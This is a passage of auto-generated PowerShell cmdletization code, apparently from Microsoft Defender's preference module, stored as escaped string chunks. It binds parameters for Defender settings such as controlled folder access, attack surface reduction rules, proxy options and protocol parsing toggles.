${ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\r\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\r\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\r\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__c"
"mdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\r\n          [object]$__cmdletization_value = ${ProxyPacUrl}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\r\n          [object]$__cmdletization_value = ${ProxyServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\r\n          [object]$__cmdletization_value = ${ProxyBypass}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\r\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableTlsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableFtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableFtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableHttpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSshParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValue"
"Present = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\r\n          [object]$__cmdletization_value = ${DisableGradualRelease}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\r\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\r\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableRdpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\r\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\r\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {\r\n          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleOffset}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {\r\n          [object]$__cmdletization_value = ${DisableTDTFeature}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTamperProtection')) {\r\n          [object]$__cmdletization_value = ${DisableTamperProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_me"
"thodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSmtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSmtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableQuicParsing')) {\r\n          [object]$__cmdletization_value = ${DisableQuicParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkProtectionReputationMode')) {\r\n          [object]$__cmdletization_value = ${NetworkProtectionReputationMode}\r\n          $__cmdletization_methodParameter = 